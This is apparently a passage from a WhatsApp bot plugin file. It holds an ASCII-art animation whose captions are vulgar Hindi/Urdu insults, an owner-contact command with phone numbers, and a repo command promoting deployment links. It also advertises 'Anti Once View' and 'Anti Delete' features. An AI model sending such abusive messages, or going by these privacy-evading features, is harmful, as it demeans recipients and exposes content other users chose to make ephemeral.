            "⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲⡀⠀\n ⠀⣴⠿⠏⠀⠀⠀⠀⠀     ⢳⡀⠀⡏⠀⠀⠀   ⠀  ⢷\n⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀   ⣧⠀⢸⠀⠀⠀  ⠀    ⡇\n⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲     ⣿  ⣸   Nikal   ⡇\n ⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀⠀      ⣿  ⢹⠀          ⡇\n  ⠙⢿⣯⠄⠀⠀⠀__⠀   ⠀   ⡿ ⠀⡇⠀⠀⠀⠀    ⡼\n⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀   ⠘⠤⣄⣠⠞⠀\n⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀⠀⠀\n⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀\n⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀ ⠀⣄⢸⠀⠀⠀⠀⠀⠀`", "⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲⡀⠀\n ⠀⣴⠿⠏⠀⠀⠀⠀⠀  ⠀  ⢳⡀⠀⡏⠀⠀⠀   ⠀  ⢷\n⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀   ⣧⠀⢸⠀⠀⠀       ⡇\n⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲     ⣿  ⣸   Lavde   ⡇\n ⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀⠀      ⣿  ⢹⠀          ⡇\n  ⠙⢿⣯⠄⠀⠀|__|⠀⠀   ⡿ ⠀⡇⠀⠀⠀⠀    ⡼\n⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀   ⠘⠤⣄⣠⠞⠀\n⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀⠀⠀\n⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀\n⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀ ⠀⣄⢸⠀⠀⠀⠀⠀⠀`", "⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲⡀⠀\n ⠀⣴⠿⠏⠀⠀     ⠀   ⢳⡀⠀⡏⠀⠀    ⠀  ⢷\n⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀   ⣧⠀⢸⠀⠀⠀⠀      ⡇\n⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲    ⣿  ⣸   Pehli   ⡇\n ⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀⠀     ⣿  ⢹⠀           ⡇\n  ⠙⢿⣯⠄⠀⠀(P)⠀⠀     ⡿ ⠀⡇⠀⠀⠀⠀    ⡼\n⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀   ⠘⠤⣄⣠⠞⠀\n⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀⠀⠀\n⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀\n⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀ ⠀⣄⢸⠀⠀⠀⠀⠀⠀`", "⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲⡀⠀\n ⠀⣴⠿⠏⠀⠀     ⠀   ⢳⡀⠀⡏⠀⠀    ⠀  ⢷\n⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀   ⣧⠀⢸⠀   ⠀     ⡇\n⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲    ⣿  ⣸  Fursat  ⡇\n ⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀        ⣿  ⢹⠀          ⡇\n  ⠙⢿⣯⠄⠀⠀⠀__ ⠀  ⠀   ⡿ ⠀⡇⠀⠀⠀⠀    ⡼\n⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀   ⠘⠤⣄⣠⠞⠀\n⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀⠀⠀\n⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀\n⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀ ⠀⣄⢸⠀⠀⠀⠀⠀⠀`", "⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲⡀⠀\n ⠀⣴⠿⠏⠀⠀⠀⠀⠀      ⢳⡀⠀⡏⠀⠀    ⠀  ⢷\n⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀   ⣧⠀⢸⠀⠀ ⠀      ⡇\n⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲    ⣿  ⣸  Meeee   ⡇\n ⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀⠀       ⣿  ⢹⠀          ⡇\n  ⠙⢿⣯⠄⠀⠀|__| ⠀    ⡿ ⠀⡇⠀⠀⠀⠀    ⡼\n⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀   ⠘⠤⣄⣠⠞⠀\n⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀⠀⠀\n⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀\n⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀ ⠀⣄⢸⠀⠀⠀⠀⠀⠀`", "⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲⡀⠀\n ⠀⣴⠿⠏⠀⠀⠀⠀   ⠀  ⠀⢳⡀⠀⡏⠀⠀       ⢷\n⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀   ⣧⠀⢸⠀  ⠀       ⡇\n⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲   ⣿  ⣸   Nikal   ⡇\n ⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀       ⣿  ⢹⠀           ⡇\n  ⠙⢿⣯⠄⠀⠀lodu⠀⠀   ⡿ ⠀⡇⠀⠀⠀⠀   ⡼\n⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀  ⡴⠃⠀   ⠘⠤⣄⣠⠞⠀\n⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀⠀⠀\n⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀\n⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀ ⠀⣄⢸⠀"
        ];

        // Send the initial loading message
        for (const asciiMessage of asciiMessages) {
            await new Promise(resolve => setTimeout(resolve, 500)); // Delay for 500ms second
            await conn.relayMessage(
                from,
                {
                    protocolMessage: {
                        key: loadingMessage.key,
                        type: 14,
                        editedMessage: {
                            conversation: asciiMessage,
                        },
                    },
                },
                {}
            );
        }
    } catch (e) {
        console.log(e);
        reply(`❌ *Error!* ${e.message}`);
    }
});

// > JawadTechX 







cmd({
    pattern: "owner",
    desc: "To check ping",
    category: "main",
    react: "👤",
    filename: __filename
},
async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{

const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + 'FN:Didula Rashmika\n'
            + 'ORG:Didula MD V2;\n'
            + 'TEL;type=CELL;type=VOICE;waid=94741671668:+94 741 671 668\n'
            + 'TEL;type=CELL;type=VOICE;waid=94771820962:+94 771 820 962\n'
            + 'END:VCARD'

await conn.sendMessage(from, { 
    contacts: { 
        displayName: 'Didula Rashmika', 
        contacts: [{ vcard }] 
    }
},{quoted:mek})

await conn.sendMessage(from,{image:{url: 'https://files.catbox.moe/za6ytm.jpg'},caption: `*👤 Didula MD V2 Owner Details*\n\n*👨‍💻 Owner Name:* Didula Rashmika\n*📱 Owner Number:* wa.me/94741671668\n*📱 Owner Number:* wa.me/94771820962\n\n\n*💫 Thanks For Using Didula MD V2*`},{quoted:mek})

} catch (e) {
    reply(e)
    }
})





cmd({
    pattern: "repo",
    desc: "repo the bot",
    react: "📡",
    category: "main",
    filename: __filename
},
async(conn, mek, m, {from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
    try {
        let dec = `*DIDULA MD V2 NEW UPDATE✅*

*⭕ REPO URL*
\`\`\`https://github.com/itsme-didulabot/Didula-MD-V2\`\`\`

*⭕ GET SESSION ID*
\`\`\`https://prabath-md-pair-web-v2-slk.koyeb.app/pair\`\`\`

*⭕ HEROKU DEPLOY*
\`\`\`https://dashboard.heroku.com/new-app?template=https://github.com/itsme-didulabot/Didula-MD-V2\`\`\`

*Deploy Video ✅*

https://youtu.be/AtjXpHEwyKg?si=iLIxkkr4ujCu72cj


SPECIAL FEATURES 👀

> Chanel working
> Heart React
> Anti Bug Message
> Anti Bad/Bot/Link/Call
> AI Chat
> Auto Status Seen React and Reply
> Anti Once View
> Send Status to reply
> Anti Delete
> Commands 100+

*AUTO PLUGIN UPDATE*

📥FOLLOW FOR UPDATE
https://whatsapp.com/channel/0029VaqqF4GDTkJwKruLSK2f`;

        await conn.sendMessage(from, {
            image: {url: 'https://files.catbox.moe/za6ytm.jpg'},
            caption: dec
        }, {quoted: mek});

    } catch(e) {
        console.log(e);
        reply(`${e}`);
    }
});
